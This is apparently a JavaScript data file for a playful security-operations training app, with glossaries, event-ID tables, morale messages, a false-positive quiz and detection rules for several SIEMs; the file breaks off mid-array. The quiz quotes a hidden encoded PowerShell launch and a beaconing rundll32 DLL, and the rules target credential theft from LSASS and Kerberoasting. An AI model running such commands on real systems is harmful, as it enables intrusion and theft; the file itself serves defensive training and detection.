// Content carried over from FP Café v1. Plain data only.
const Q = s => s.replace(/§/g, "`");
export const TERMS = [
  ["KEV","CISA's Known Exploited Vulnerabilities catalog: CVEs confirmed to be exploited in the wild. If it's in KEV and you have it, it jumps the queue."],
  ["EPSS","Exploit Prediction Scoring System: the probability (0–1) that a CVE will be exploited in the next 30 days. CVSS says how bad; EPSS says how likely."],
  ["Living off the land (LOLBins)","Attackers using built-in tools like PowerShell, certutil or rundll32 instead of malware, so they blend in with admins."],
  ["Beaconing","Malware checking in with its command-and-control server on a regular rhythm. Suspiciously perfect intervals are a tell."],
  ["Dwell time","How long an attacker is inside before being detected. Your job, in one metric: make it shorter."],
  ["Pass-the-hash","Logging in with a stolen password hash instead of the password itself. Why protecting LSASS matters."],
  ["Kerberoasting","Requesting service tickets for accounts with SPNs, then cracking them offline. Long, random service-account passwords ruin it."],
  ["SBOM","Software Bill of Materials: a list of components inside your software. Log4Shell is why everyone suddenly wanted one."],
  ["Sigma","A vendor-neutral format for detection rules that converts into KQL, SPL and others. Write once, hunt anywhere."],
  ["Initial access broker","Criminals who break in and sell the access to ransomware groups. The breach and the ransomware are often different people."]
];
export const EVENTS = [
  ["4624","An account successfully logged on","Check the logon type (see Logon types tab)"],
  ["4625","An account failed to log on","Spikes = brute force or a broken service account"],
  ["4634","An account was logged off",""],
  ["4648","Logon using explicit credentials","e.g. runas; can show lateral movement"],
  ["4672","Special privileges assigned to new logon","Admin-equivalent logons"],
  ["4688","A new process has been created","Enable command-line auditing to make it useful"],
  ["4697","A service was installed (Security log)","Persistence / lateral movement"],
  ["4698","A scheduled task was created","Persistence"],
  ["4720","A user account was created","Unexpected new accounts = red flag"],
  ["4728","Member added to a security-enabled global group","Watch Domain Admins"],
  ["4732","Member added to a security-enabled local group","Watch local Administrators"],
  ["4740","A user account was locked out","Brute force or a stale password"],
  ["4768","Kerberos TGT requested","Authentication on DCs"],
  ["4769","Kerberos service ticket requested","Many RC4 requests can mean Kerberoasting"],
  ["4771","Kerberos pre-authentication failed","Password spraying against Kerberos"],
  ["4776","DC attempted to validate credentials (NTLM)","NTLM usage and failures"],
  ["1102","The audit log was cleared","Almost never legitimate in production"],
  ["7045","A service was installed (System log)","Persistence; check the image path"],
  ["4104","PowerShell script block logged","Shows decoded script content"]
];
export const SYSMON = [
  ["1","Process creation","Full command line + parent process + hashes"],
  ["3","Network connection","Which process talked to which IP/port"],
  ["7","Image loaded","DLL loads; noisy, filter it"],
  ["8","CreateRemoteThread","Common in process injection"],
  ["10","ProcessAccess","e.g. something opening LSASS"],
  ["11","FileCreate","Dropped files"],
  ["12/13","Registry create/delete, value set","Run keys and other persistence"],
  ["22","DNS query","Which process resolved which domain"]
];
export const LOGONS = [
  ["2","Interactive","Keyboard at the machine"],
  ["3","Network","SMB, file shares; most common in lateral movement"],
  ["4","Batch","Scheduled tasks"],
  ["5","Service","Services starting under an account"],
  ["7","Unlock","Unlocking a workstation"],
  ["8","NetworkCleartext","Credentials sent in cleartext (e.g. basic auth)"],
  ["9","NewCredentials","runas /netonly"],
  ["10","RemoteInteractive","RDP"],
  ["11","CachedInteractive","Logon with cached domain credentials (offline)"]
];
export const ATTACK = [
  ["T1566","Phishing"],["T1190","Exploit Public-Facing Application"],["T1078","Valid Accounts"],
  ["T1059.001","PowerShell"],["T1053.005","Scheduled Task"],["T1003.001","LSASS Memory (credential dumping)"],
  ["T1021.001","Remote Desktop Protocol"],["T1486","Data Encrypted for Impact (ransomware)"],
  ["T1547.001","Registry Run Keys / Startup Folder"],["T1071.001","Application Layer Protocol: Web"],
  ["T1110","Brute Force"],["T1136","Create Account"],["T1105","Ingress Tool Transfer"],
  ["T1218.011","Rundll32"],["T1070.001","Clear Windows Event Logs"],["T1543.003","Windows Service"]
];
export const WORDS = [
  ["PATCH","The fix. Also the name of our cat."],["PROXY","Sits between client and server. Great for logging; attackers love abusing them too."],
  ["SHELL","What attackers want. Web shells, reverse shells: if you see one, it's a bad day."],["TOKEN","Session tokens can be stolen to skip passwords and MFA (see Citrix Bleed)."],
  ["SPOOF","Faking an identity: email sender, IP, caller ID. SPF/DKIM/DMARC fight email spoofing."],["NONCE","A number used once. Prevents replay attacks in crypto protocols."],
  ["CHAIN","Attackers chain small bugs into a big one. Also: supply chain."],["ROGUE","Rogue access points, rogue admins, rogue devices: anything unauthorised on your network."],
  ["ALERT","What you dream about at night. Not in a good way."],["PHISH","Still the #1 way in for most organisations. Report, don't click."],
  ["AUDIT","Audit logs are how you reconstruct what happened. Clearing them (event 1102) is a red flag."],["CYBER","The prefix that makes everything sound 30% more expensive."],
  ["ADMIN","The account everyone wants. Use separate admin accounts and never browse the web with them."],["LOGIN","Failed logins (4625) in bursts = brute force or spraying."],
  ["EXFIL","Exfiltration: data leaving. Watch for big uploads to cloud storage at 3 AM."],["QUEUE","The alert queue. It is never empty. It never will be. Accept it."],
  ["SIGMA","Vendor-neutral detection rule format. Write once, convert to KQL/SPL."],["SNORT","Classic open-source IDS. Its rules inspired many network signatures."],
  ["MITRE","The org behind ATT&CK and the CVE program."],["LSASS","Windows process holding credentials in memory. Protect it; alert on access."],
  ["PIVOT","Moving from one compromised host to another. Also what analysts do between data sources."],["BRUTE","Brute force: guessing passwords fast. MFA and lockout policies slow it down."],
  ["AGENT","EDR agents, AI agents… all need protecting now."],["FLOOD","SYN floods and DDoS. Volume as a weapon."],
  ["VAULT","Where secrets should live instead of in scripts."],["TRUST","Zero trust: verify every request, assume breach."],
  ["RELAY","NTLM relay: forwarding authentication to another server. SMB signing helps."],["SPAWN","Process spawning: Word spawning PowerShell is a classic red flag."],
  ["DECOY","Honeypots and canary tokens: decoys that alert when touched."],["CRACK","Offline password cracking of stolen hashes. Long passphrases win."]
];
export const SAY_DAY = ["You are not your alert count. ","Closing a false positive is still closing something. Progress!",
 "Nobody notices the breaches you stopped. I noticed. Good job.","Hydrate. The queue is a marathon. Also a treadmill.",
 "If the alert says 'critical' and the asset is the printer… breathe first.","Escalating is not failing. It's teamwork with extra steps.",
 "You read the logs so the CEO doesn't have to. Hero behaviour.","'It worked in the lab' is a valid emotional state.",
 "Stretch your neck. Your SIEM can't see you. Probably.","Today's SOCdle is waiting. Low stakes. High bragging rights."];
export const SAY_NIGHT = ["3 AM thoughts are not incident findings. Write them down, review at 9. ","Night crew: the internet never sleeps, so you're its babysitter.",
 "Snack check. A fed analyst is a calm analyst.","If it's quiet… don't say it's quiet. ","The attackers are in a different time zone. They're tired too."];
export const SAY_GENTLE = ["You're doing better than you think. ","One alert at a time. That's the whole job.","Take a slow breath. You've got this.","It's okay not to know everything. Nobody does. Ask, learn, move on.","Proud of you for showing up today."];
export const SAY_ROLE = {"SOC manager":["Your team is doing more than the dashboards show. Tell them.","Metrics show trends, not people's worth. ","A 10-minute 1:1 can prevent a 10-week burnout."],
  "Detection eng":["Every noisy rule you tune gives an analyst an hour back.","Test your rule against last week's data before Friday. Trust me."],
  "Threat hunter":["No findings is a finding. Write it up.","Baseline first. Then go weird."],
  "IR / L2":["Timeline first, theories second.","Document as you go. Future you is tired."],
  "L1 analyst":["Asking 'is this normal?' is a skill, not a weakness.","Escalate when unsure. That's literally the process."]};
export const HORO = {
 "L1 analyst":["Mercury is in retrograde and so is your queue. An alert you closed yesterday will return with a new hostname.","The stars favour you: a phishing report will actually be phishing. Savour it.","Expect a mysterious PowerShell alert. It is the IT admin. It is always the IT admin.","A user will say 'I didn't click anything'. The logs will lovingly disagree."],
 "IR / L2":["Today, the first event in your timeline will be the actual first event.","A lead goes cold, but a scheduled task speaks. Listen to the scheduled task.","Someone will ask 'are we breached?' on a call. You'll say 'investigating'. Your aura: majestic.","Beware evidence sent as a screenshot. Ask for the logs. Nicely. Twice."],
 "Detection eng":["Your new rule will fire 4,000 times. Three of them will be beautiful.","A Sigma rule you wrote in 2023 saves the day. Past you says 'you're welcome'.","You will tune a noisy rule today and the SOC will silently love you forever.","The universe whispers: add a filter for the backup server. You know which one."],
 "Threat hunter":["The hypothesis you dismissed at standup is the one. Go back for it.","You'll find something weird in DNS. It will be fine. It will also be weird.","A rare parent-child process pair awaits. Bring snacks.","Stars say: baseline first, panic later."],
 "SOC manager":["A vendor will promise to 'eliminate alert fatigue'. Your team will laugh in a meeting you're not in.","Budget season approaches. Your red heatmap has never looked so useful.","Today, thank an analyst by name. The ROI is unreal.","Someone will ask for a 'quick' metric. It will not be quick."]
};
export const FF = [
 {q:"EventID 4625 x 3,200\nAccount: svc_backup\nSource: BACKUP-01\nWindow: 02:00–02:05",a:"FP",why:"Expired password on a backup service account. Persistent, like you."},
 {q:"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0A...\nParent: WINWORD.EXE",a:"TP",why:"Word spawning hidden encoded PowerShell is never a vibe. Isolate and investigate."},
 {q:"Impossible travel: Singapore → Frankfurt in 9 minutes\nUser: j.tan\nUser-Agent: corporate VPN client",a:"FP",why:"VPN egress moved countries; the user did not. Classic geo FP."},
 {q:"New service: 'WindowsUpdateSvc'\nImage: C:\\Users\\Public\\upd.exe\nEventID 7045",a:"TP",why:"Real services don't live in C:\\Users\\Public. That's an attacker naming things to sound boring."},
 {q:"DNS spike to *.windowsupdate.com\nHosts: 400 endpoints\nTime: Patch Tuesday, 18:05 UTC",a:"FP",why:"It's Patch Tuesday. Everyone is downloading updates. Breathe."},
 {q:"rundll32.exe C:\\ProgramData\\a.dll,DllRegisterServer\nOutbound to 185.x.x.x:443 every 60s exactly",a:"TP",why:"A DLL in ProgramData beaconing on a perfect 60s timer = C2 heartbeat. Contain it."},
 {q:"EventID 1102: The audit log was cleared\nAccount: helpdesk_temp\nHost: FILESRV-02\nTime: 03:12",a:"TP",why:"A temp helpdesk account clearing logs at 3 AM is someone covering tracks. Escalate."},
 {q:"4740 account lockout x 1\nUser: m.lee\nSource: m.lee's phone (ActiveSync)\nAfter: password change at 09:00",a:"FP",why:"Old password still saved on the phone. The most common lockout in history."}
];
export const SMASH = ["PRINTER-3F-02 has been neutralised. It will return.","Printer down. Morale up.","The printer has been isolated. Emotionally.","Incident closed: root cause = printer existed.","PC LOAD LETTER? Not today."];
export const FPL = ["FP","4625","DNS","AV","UEBA","GEO","MFA","EDR","PS1","IMP"];
export const NUDGE = {eyes:[20,"20-20-20: look at something 20 ft away for 20 seconds. Not the SIEM."],water:[60,"Hydration check. Logs aren't a beverage."],
  stretch:[90,"Stand up, roll your shoulders. The alerts will wait 60 seconds."],focus:[25,"Focus block done. Take 5 — try the Break Room."]};
export const DEFAULT_CK = ["Check SIEM/EDR health dashboards (ingestion OK?)","Read the previous shift's handover","Review open high-severity incidents","Check today's Morning Brew for new KEV items","Confirm on-call / escalation contacts","Do today's SOCdle (morale is a control)"];
export const ROLES = ["L1 analyst","IR / L2","Detection eng","Threat hunter","SOC manager"];
export const SIEMS = ["Sentinel / Defender","Splunk","Google SecOps","Elastic","QRadar","Other"];
export const VENDORS = ["Microsoft","Cisco","Fortinet","Palo Alto","Ivanti","Citrix","VMware","Linux","Open source"];
export const BUDDIES = {
  sunny:{e:"",n:"Sunny",d:"bubbly L1 who treats every alert like a mystery novel"},
  dex:{e:"",n:"Dex",d:"deadpan veteran, has seen forty thousand false positives"},
  rin:{e:"",n:"Rin",d:"quiet threat hunter, three queries ahead of you"},
  theo:{e:"",n:"Theo",d:"calm IR lead, breathes in incidents, breathes out timelines"},
  juno:{e:"",n:"Juno",d:"ex red teamer gone blue, chaotic good"},
  noor:{e:"",n:"Noor",d:"night-shift legend, kind, unshakeable"}};
// Each colleague has their own voice. Mixed into the general chatter.
export const CHAR_LINES = {
  sunny:["Ooh, a new alert! Okay, okay, who did it? Let's find out.","Fun fact: every false positive is a tiny lesson in disguise. A very annoying disguise.","I made a playlist for triage. It's 90% synthwave.","Small win: you read the whole alert before deciding. Proud of you.","Water check! I'm on my second bottle. You?","Today's vibe: curious, caffeinated, kind.","If it's weird, write it down. Weird is where the good stuff hides."],
  dex:["Another impossible travel alert. It's the VPN. It's always the VPN.","I'm not grumpy. This is just my face.","Patch it, log it, close it. Then coffee.","I've seen this alert before. I'll see it again. We are old friends.","Take your break. The SIEM will still be wrong when you get back.","Somebody opened an invoice zip. Of course they did.","Fine. That was actually a good catch."],
  rin:["Hypothesis first. Then the query. Then the coffee.","If it beacons every 60 seconds, it's not a person.","Look at what happened after the alert, not just the alert.","Parent process, child process, network. In that order.","Quiet shifts are the best time to hunt.","Turn a good hunt into a detection, or it didn't happen twice.","I like this one. It's lying about its parent process."],
  theo:["Breathe. Write the timeline. Then decide.","Nobody fixes an incident faster by panicking. Slow is smooth.","Blameless doesn't mean nobody learns. It means everybody does.","Who owns it, what's the impact, what's next. That's the whole meeting.","Containment first, curiosity second.","Good handover notes are a gift to future you.","You did fine today. Really."],
  juno:["I used to break in. Now I catch people breaking in. Same snacks.","If I wanted in, I'd go for the forgotten staging server. Do we have one? We have one.","Default passwords are just invitations with extra steps.","Attackers love a Friday. So do I, for different reasons.","Old API? Still online? Bold.","Credentials in a build log? Chef's kiss. For them. Not for us.","Let's go break something. In the lab. Legally."],
  noor:["It's quiet. Too quiet. Kidding, it's just 3 AM.","Night shift rule one: double-check anything you close.","Bright light, cold water, short walk. Then the queue.","Eat something real. Vending machine crisps don't count.","Sunrise soon. You made it.","If you're tired, say so. That's how teams stay safe.","Write it down for the morning crew. They'll thank you."]};
export const MOODS = [["","Great"],["","Good"],["","Meh"],["","Drained"],["streak","On fire (bad kind)"]];
export const MOOD_REPLY = ["Love that energy. Go hunt something. ","Steady is good. Steady is underrated.","Meh is valid. Small wins today: one ticket at a time.",
  "Drained is real. Take your breaks for real today, and the Break Room is one click away. ","Ouch. Breathe first (try Handshake breathing), and loop in your lead if the load is too much. You don't have to carry it alone."];
export const LEVELS = [[0,"","Fresh Intern"],[50,"","Alert Tamer"],[150,"","Log Whisperer"],[300,"","Triage Ninja"],[600,"","Threat Hunter"],[1000,"","Incident Wrangler"],[1600,"","SOC Sensei"],[2500,"","Legendary Defender"]];
export const BADGES = [
  ["hook","First Catch","Catch a phish in the aquarium",()=>stats.phish>=1],["fish","Phish Whisperer","Catch 10 phish",()=>stats.phish>=10],
  ["bubble","Bubble Popper","Pop 100 false positives",()=>stats.pop>=100],["wave","Zen Handshake","Finish 5 breathing sessions",()=>stats.breath>=5],
  ["target","Sharp Eye","10 correct FP/TP calls",()=>stats.ffok>=10],["cards","Flashcard Nerd","Know 20 ATT&CK cards",()=>stats.card>=20],
  ["socdle","Word Nerd","Win a SOCdle",()=>(store.get("dleStats",{}).won||0)>=1],["flame","On a Streak","3-day SOCdle streak",()=>(store.get("dleStats",{}).best||0)>=3],
  ["brew","Regular","Read 5 Morning Brews",()=>stats.brew>=5],["arcade","Arcade Rat","Play 10 Arcade games",()=>stats.arcade>=10],["fame","Team Player","Add a teammate's score to a leaderboard",()=>Object.keys(allData()).some(k=>k.startsWith("fpc_lb_")&&lbGet(k.slice(7)).some(x=>!x.me))],
  ["moon","Night Owl","Visit during the night shift",()=>stats.night>=1],["printer","Printer Nemesis","Smash 50 printer alerts",()=>stats.smash>=50],
  ["heart","Self-aware","Do 7 mood check-ins",()=>Object.keys(moods()).length>=7],["star","Curator","Watch 3 CVEs",()=>watch.length>=3]];
export const DETECTIONS = [
 {id:"office-child", t:"Office app spawning a script engine", tech:"T1566.001 / T1059", tactic:"Execution", sev:"high",
  why:"Word, Excel or Outlook launching PowerShell, cmd, mshta or rundll32 is the classic sign of a malicious document or attachment.",
  data:"Process creation with parent process: Sysmon EID 1, Defender DeviceProcessEvents, or Windows 4688 with command-line auditing.",
  fp:["Office add-ins or macros used by finance/reporting teams","IT automation launched from Excel workbooks"],
  triage:["Open the parent document: where did it come from (email, download, share)?","Decode any -enc PowerShell and read what it does","Check network connections from the child process in the next 5 minutes","Search for the same file hash or sender across the org"],
  respond:["Isolate the host if the child process made outbound connections","Purge the email from all mailboxes","Reset the user's password if credentials may be exposed"],
  tune:"Allow-list known add-in paths and signed internal tools by hash, not by name.",
  kql:Q(String.raw`DeviceProcessEvents
| where InitiatingProcessFileName in~ ("winword.exe","excel.exe","powerpnt.exe","outlook.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine`),
  spl:Q(String.raw`index=sysmon EventCode=1
  (ParentImage="*\\winword.exe" OR ParentImage="*\\excel.exe" OR ParentImage="*\\powerpnt.exe" OR ParentImage="*\\outlook.exe")
  (Image="*\\powershell.exe" OR Image="*\\pwsh.exe" OR Image="*\\cmd.exe" OR Image="*\\mshta.exe" OR Image="*\\wscript.exe" OR Image="*\\rundll32.exe")
| table _time host User ParentImage Image CommandLine`),
  yaral:Q(String.raw`rule fpcafe_office_spawns_script_engine {
  meta:
    author = "FP Cafe"
    description = "Office application launching a script engine or LOLBin"
    mitre_attack_technique = "T1059"
    severity = "High"
  events:
    $e.metadata.event_type = "PROCESS_LAUNCH"
    re.regex($e.principal.process.file.full_path, §(?i)\\(winword|excel|powerpnt|outlook)\.exe$§)
    re.regex($e.target.process.file.full_path, §(?i)\\(powershell|pwsh|cmd|wscript|cscript|mshta|rundll32)\.exe$§)
  condition:
    $e
}`),
  sigma:Q(String.raw`title: Office Application Spawning Script Engine
status: experimental
logsource:
  product: windows
  category: process_creation
detection:
  selection_parent:
    ParentImage|endswith:
      - '\winword.exe'
      - '\excel.exe'
      - '\powerpnt.exe'
      - '\outlook.exe'
  selection_child:
    Image|endswith:
      - '\powershell.exe'
      - '\pwsh.exe'
      - '\cmd.exe'
      - '\wscript.exe'
      - '\cscript.exe'
      - '\mshta.exe'
      - '\rundll32.exe'
  condition: selection_parent and selection_child
falsepositives:
  - Legitimate macros and add-ins
level: high
tags:
  - attack.execution
  - attack.t1059`)},

 {id:"log-cleared", t:"Security audit log cleared", tech:"T1070.001", tactic:"Defense Evasion", sev:"high",
  why:"Event 1102 means someone wiped the Security log. Admins almost never need to in production; attackers do it to hide their tracks.",
  data:"Windows Security log (event 1102) forwarded to your SIEM.",
  fp:["Planned log maintenance on lab or test machines","Re-imaging workflows"],
  triage:["Who cleared it, and is that account normally used interactively?","What happened on this host in the hour before the clear? (check other log sources: EDR, network)","Was the same account used on other hosts around the same time?"],
  respond:["Treat as likely compromise until explained","Preserve EDR telemetry and memory if possible","Disable or reset the account involved pending investigation"],
  tune:"Exclude known lab hosts by asset tag, never by account name alone.",
  kql:Q(String.raw`SecurityEvent
| where EventID == 1102
| project TimeGenerated, Computer, Account, Activity`),
  spl:Q(String.raw`index=wineventlog source="WinEventLog:Security" EventCode=1102
| table _time host user`),
  yaral:Q(String.raw`rule fpcafe_security_log_cleared {
  meta:
    author = "FP Cafe"
    description = "Windows Security audit log cleared (event 1102)"
    mitre_attack_technique = "T1070.001"
    severity = "High"
  events:
    $e.metadata.vendor_name = "Microsoft"
    $e.metadata.product_event_type = "1102"
  condition:
    $e
}`),
  sigma:Q(String.raw`title: Security Event Log Cleared
status: stable
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 1102
  condition: selection
falsepositives:
  - Planned maintenance on non-production hosts
level: high
tags:
  - attack.defense-evasion
  - attack.t1070.001`)},

 {id:"lsass-access", t:"Process accessing LSASS memory", tech:"T1003.001", tactic:"Credential Access", sev:"high",
  why:"Reading LSASS memory is how tools like Mimikatz or procdump steal passwords and hashes.",
  data:"Process access telemetry: Sysmon EID 10 (with LSASS in the config) or Defender DeviceEvents.",
  fp:["EDR/AV agents and backup software","Some monitoring tools and crash handlers"],
  triage:["Which process opened LSASS, and is it signed?","Was a .dmp file written soon after? (Sysmon EID 11)","Which accounts were logged on to that host recently? Assume their credentials are exposed"],
  respond:["Isolate the host","Reset passwords for accounts that had sessions on the host, privileged ones first","Hunt for the same tool hash across the fleet"],
  tune:"Allow-list security tools by full path and signer. Watch GrantedAccess values such as 0x1010 and 0x1410.",
  kql:Q(String.raw`DeviceEvents
| where ActionType == "OpenProcessApiCall" and FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsMpEng.exe","MsSense.exe","svchost.exe")
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine`),
  spl:Q(String.raw`index=sysmon EventCode=10 TargetImage="*\\lsass.exe"
  NOT (SourceImage="*\\MsMpEng.exe" OR SourceImage="*\\svchost.exe")
| stats count by host SourceImage GrantedAccess`),
  yaral:Q(String.raw`rule fpcafe_lsass_access {
  meta:
    author = "FP Cafe"
    description = "Non-allow-listed process opening LSASS"
    mitre_attack_technique = "T1003.001"
    severity = "High"
  events:
    $e.metadata.event_type = "PROCESS_OPEN"
    re.regex($e.target.process.file.full_path, §(?i)\\lsass\.exe$§)
    not re.regex($e.principal.process.file.full_path, §(?i)\\(MsMpEng|MsSense|svchost)\.exe$§)
  condition:
    $e
}`),
  sigma:Q(String.raw`title: Suspicious LSASS Process Access
status: experimental
logsource:
  product: windows
  category: process_access
detection:
  selection:
    TargetImage|endswith: '\lsass.exe'
  filter_security_tools:
    SourceImage|endswith:
      - '\MsMpEng.exe'
      - '\MsSense.exe'
      - '\svchost.exe'
  condition: selection and not filter_security_tools
falsepositives:
  - Security and backup software
level: high
tags:
  - attack.credential-access
  - attack.t1003.001`)},

 {id:"sched-task", t:"New scheduled task created", tech:"T1053.005", tactic:"Persistence", sev:"medium",
  why:"Scheduled tasks are a favourite way to survive reboots. Most environments have a small, known set; the rest deserve a look.",
  data:"Windows Security event 4698 (needs 'Audit Other Object Access Events') or EDR task telemetry.",
  fp:["Software installers and updaters","Group Policy and IT management tools"],
  triage:["What does the task run, and from which folder? (Users, ProgramData or Temp = suspicious)","Who created it, and from which process?","How often does it run? Every few minutes is suspicious"],
  respond:["Disable the task and collect its binary","Hunt for the same task name or action path elsewhere"],
  tune:"Baseline task names for a week, then alert on new names or actions in user-writable paths.",
  kql:Q(String.raw`SecurityEvent
| where EventID == 4698
| parse EventData with * 'TaskName">' TaskName "<" *
| project TimeGenerated, Computer, Account, TaskName`),
  spl:Q(String.raw`index=wineventlog source="WinEventLog:Security" EventCode=4698
| table _time host user Task_Name`),
  yaral:Q(String.raw`rule fpcafe_scheduled_task_created {
  meta:
    author = "FP Cafe"
    description = "Scheduled task created (event 4698)"
    mitre_attack_technique = "T1053.005"
    severity = "Medium"
  events:
    $e.metadata.vendor_name = "Microsoft"
    $e.metadata.product_event_type = "4698"
  condition:
    $e
}`),
  sigma:Q(String.raw`title: Scheduled Task Created
status: experimental
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4698
  condition: selection
falsepositives:
  - Software updaters and IT management tools
level: medium
tags:
  - attack.persistence
  - attack.t1053.005`)},

 {id:"svc-userpath", t:"Service installed from a user-writable folder", tech:"T1543.003", tactic:"Persistence", sev:"high",
  why:"Real services rarely live in Users, ProgramData or Temp. Attackers give them boring names like 'UpdateSvc'.",
  data:"Windows System log event 7045 (service installed).",
  fp:["Some poorly packaged vendor software","Developer machines"],
  triage:["Check the service binary path, signer and hash","Was it installed remotely? (look for a matching network logon, 4624 type 3, just before)","Does the same service name exist on other hosts?"],
  respond:["Stop and disable the service, collect the binary","If installed remotely, treat the source host as compromised too"],
  tune:"Allow-list signed vendor binaries by hash; keep path-based alerting for everything else.",
  kql:Q(String.raw`Event
| where EventLog == "System" and EventID == 7045
| where RenderedDescription has_any (@"\Users\", @"\ProgramData\", @"\Temp\")
| project TimeGenerated, Computer, RenderedDescription`),
  spl:Q(String.raw`index=wineventlog source="WinEventLog:System" EventCode=7045
  (Service_File_Name="*\\Users\\*" OR Service_File_Name="*\\ProgramData\\*" OR Service_File_Name="*\\Temp\\*")
| table _time host Service_Name Service_File_Name`),
  yaral:Q(String.raw`rule fpcafe_service_from_user_writable_path {
  meta:
    author = "FP Cafe"
    description = "Service installed (7045) with an image path in a user-writable folder"
    mitre_attack_technique = "T1543.003"
    severity = "High"
  events:
    $e.metadata.vendor_name = "Microsoft"
    $e.metadata.product_event_type = "7045"
    // field holding the service image path depends on your parser; check UDM in your tenant
    re.regex($e.target.process.file.full_path, §(?i)\\(users|programdata|temp)\\§)
  condition:
    $e
}`),
  sigma:Q(String.raw`title: Service Installed From User-Writable Folder
status: experimental
logsource:
  product: windows
  service: system
detection:
  selection:
    EventID: 7045
    ImagePath|contains:
      - '\Users\'
      - '\ProgramData\'
      - '\Temp\'
  condition: selection
falsepositives:
  - Poorly packaged vendor software
level: high
tags:
  - attack.persistence
  - attack.t1543.003`)},

 {id:"kerberoast", t:"Possible Kerberoasting (many RC4 service tickets)", tech:"T1558.003", tactic:"Credential Access", sev:"medium",
  why:"Attackers request service tickets for accounts with SPNs, then crack them offline. A burst of RC4 (0x17) tickets from one user is the giveaway.",
  data:"Domain controller Security event 4769 (Kerberos service ticket requested).",
  fp:["Legacy applications that still use RC4","Vulnerability scanners and some monitoring tools"],
  triage:["Which account requested the tickets, and from which host?","How many different services in how short a time?","Are any targeted service accounts privileged or using weak passwords?"],
  respond:["Reset passwords of targeted service accounts to long random values (25+ chars)","Investigate the requesting host for compromise","Move service accounts to gMSAs and disable RC4 where possible"],
  tune:"Exclude known legacy apps by service name; alert when one account hits several services within an hour.",
  kql:Q(String.raw`SecurityEvent
| where EventID == 4769
| parse EventData with * 'ServiceName">' ServiceName "<" * 'TicketEncryptionType">' TicketEncryptionType "<" *
| where TicketEncryptionType == "0x17" and ServiceName !endswith "$" and ServiceName != "krbtgt"
| summarize Services = dcount(ServiceName) by Account, bin(TimeGenerated, 1h)
| where Services > 3`),
  spl:Q(String.raw`index=wineventlog source="WinEventLog:Security" EventCode=4769 Ticket_Encryption_Type=0x17
  Service_Name!="*$" Service_Name!="krbtgt"
| bin _time span=1h
| stats dc(Service_Name) as services values(Service_Name) as targets by _time Account_Name Client_Address
| where services > 3`),
  yaral:Q(String.raw`rule fpcafe_kerberoasting_rc4_burst {
  meta:
    author = "FP Cafe"
    description = "One account requesting many RC4 service tickets within an hour"
    mitre_attack_technique = "T1558.003"
    severity = "Medium"
  events:
    $e.metadata.vendor_name = "Microsoft"
    $e.metadata.product_event_type = "4769"
    // where TicketEncryptionType lands depends on your parser; check UDM in your tenant
    $e.additional.fields["TicketEncryptionType"] = "0x17"
    $e.principal.user.userid = $user
  match:
    $user over 1h
  condition:
    #e > 3
}`),
  sigma:Q(String.raw`title: Kerberos Service Ticket Requested With RC4
status: experimental
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4769
    TicketEncryptionType: '0x17'
  filter_machine_accounts:
    ServiceName|endswith: '$'
  filter_krbtgt:
    ServiceName: 'krbtgt'
  condition: selection and not 1 of filter_*
falsepositives:
  - Legacy applications using RC4
level: medium
tags:
  - attack.credential-access
  - attack.t1558.003`)}
];
export const DET_TABS = [["kql","KQL · Defender/Sentinel"],["spl","SPL · Splunk"],["yaral","YARA-L · Google SecOps"],["sigma","Sigma · any SIEM"]];
export const LOFI_CHORDS = [[53,57,60,64],[52,55,59,62],[50,53,57,60],[48,52,55,59]];
export const SHOP = [
 {id:"cap",cat:"hat",e:"",n:"Cap",c:30},{id:"shades",cat:"hat",e:"",n:"Shades",c:50},{id:"tophat",cat:"hat",e:"",n:"Top hat",c:60},
 {id:"phones",cat:"hat",e:"",n:"Headphones",c:80},{id:"helmet",cat:"hat",e:"",n:"Incident helmet",c:100},{id:"grad",cat:"hat",e:"",n:"Cert hat",c:120},{id:"crown",cat:"hat",e:"",n:"SOC royalty",c:250},
 {id:"matrix",cat:"theme",e:"",n:"Matrix",c:150,d:"green-on-black terminal vibes"},{id:"synth",cat:"theme",e:"",n:"Synthwave",c:150,d:"neon 80s night shift"},
 {id:"amber",cat:"theme",e:"",n:"Amber terminal",c:150,d:"retro CRT glow"},{id:"sakura",cat:"theme",e:"",n:"Sakura",c:150,d:"soft pink calm"},
 {id:"coral",cat:"decor",e:"",n:"Coral reef",c:40},{id:"castle",cat:"decor",e:"",n:"Firewall castle",c:80},{id:"chest",cat:"decor",e:"",n:"Treasure chest",c:100},
 {id:"octo",cat:"decor",e:"",n:"Octo-analyst",c:120,d:"eight arms, eight consoles"},{id:"shark",cat:"decor",e:"",n:"Red team shark",c:250,d:"cruises your tank. purple teaming!"},
 {id:"coffee",cat:"snack",e:"",n:"Coffee",c:3,d:"+25 energy"},{id:"onigiri",cat:"snack",e:"",n:"Onigiri",c:5,d:"+20 energy, +10 happy"},{id:"donut",cat:"snack",e:"",n:"Donut",c:4,d:"+30 happy"}];
export const GEN = [{id:"l1",e:"users",n:"L1 analyst",c:15,r:0.5,d:"Coffee in, triage out."},{id:"rule",e:"scroll",n:"Detection rule",c:100,r:3,d:"Catches things while you sleep."},
 {id:"soar",e:"bot",n:"SOAR playbook",c:1100,r:20,d:"Auto-closes the obvious stuff."},{id:"ti",e:"satellite",n:"Threat intel feed",c:12000,r:110,d:"Context on tap."},
 {id:"ai",e:"brain",n:"AI triage agent",c:130000,r:700,d:"Fast. Needs guardrails."},{id:"mssp",e:"tycoon",n:"MSSP contract",c:1.4e6,r:4000,d:"Somebody else's night shift."}];
export const UPG = [{id:"kbd",gen:null,need:0,c:200,e:"keyboard",n:"Mechanical keyboard",d:"Manual triage x5"},{id:"coffee",gen:"l1",need:5,c:500,e:"brew",n:"Coffee machine",d:"L1 analysts x2"},
 {id:"tune",gen:"rule",need:5,c:3000,e:"target",n:"Tune noisy rules",d:"Detection rules x2"},{id:"runbook",gen:"soar",need:5,c:30000,e:"book",n:"Runbooks",d:"SOAR x2"},
